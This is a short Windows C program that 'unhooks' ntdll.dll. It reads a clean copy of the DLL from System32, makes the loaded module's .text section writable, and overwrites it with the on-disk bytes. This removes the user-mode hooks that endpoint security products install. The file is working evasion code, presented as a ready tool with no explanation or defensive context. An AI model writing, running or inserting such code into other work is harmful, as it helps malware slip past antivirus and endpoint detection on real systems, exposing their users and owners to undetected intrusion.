#include <windows.h>
#include <stdio.h>


int main() {

    HANDLE hFile = CreateFileA( "C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL );

    if ( hFile == INVALID_HANDLE_VALUE ) {
        fprintf( stderr, "Failed to open file: %lu\n", GetLastError() );
        return 1;
    }

    HANDLE hMapping = CreateFileMappingA( hFile, NULL, PAGE_READONLY, 0, 0, NULL );

    LPVOID lpBaseAddress = MapViewOfFile( hMapping, FILE_MAP_READ, 0, 0, 0 );

    printf( "[+] Mapped ntdll.dll 0x%p\n", lpBaseAddress );

    HMODULE hNtdll = GetModuleHandleA( "ntdll.dll" );

    printf( "[+] ntdll.dll loaded at 0x%p\n", hNtdll );

    PIMAGE_DOS_HEADER pDosHeader = ( PIMAGE_DOS_HEADER )lpBaseAddress;
    PIMAGE_NT_HEADERS pNtHeaders = ( PIMAGE_NT_HEADERS )( ( PBYTE )lpBaseAddress + pDosHeader->e_lfanew );
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION( pNtHeaders );

    for ( int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++ ) {
        if ( strcmp( ( char* )pSectionHeader->Name, ".text" ) == 0 ) {
            LPVOID lpTextSectionAddress = ( LPVOID )( ( PBYTE )lpBaseAddress + pSectionHeader->PointerToRawData );
            SIZE_T textSectionSize = pSectionHeader->SizeOfRawData;

            LPVOID lpNtdllTextSectionAddress = ( LPVOID )( ( PBYTE )hNtdll + pSectionHeader->VirtualAddress );

            DWORD oldProtect;
            if ( !VirtualProtect( lpNtdllTextSectionAddress, textSectionSize, PAGE_EXECUTE_READWRITE, &oldProtect ) ) {
                fprintf( stderr, "Failed to change protection: %lu\n", GetLastError() );
            }

            memcpy( ( LPVOID )( ( PBYTE )hNtdll + pSectionHeader->VirtualAddress ), lpTextSectionAddress, textSectionSize );

            VirtualProtect( lpNtdllTextSectionAddress, textSectionSize, oldProtect, &oldProtect );
            break;
        }
        pSectionHeader++;
    }

    printf( "[+] Unhooked ntdll.dll\n" );

    UnmapViewOfFile( lpBaseAddress );
    CloseHandle( hMapping );
    CloseHandle( hFile );

    return 0;
}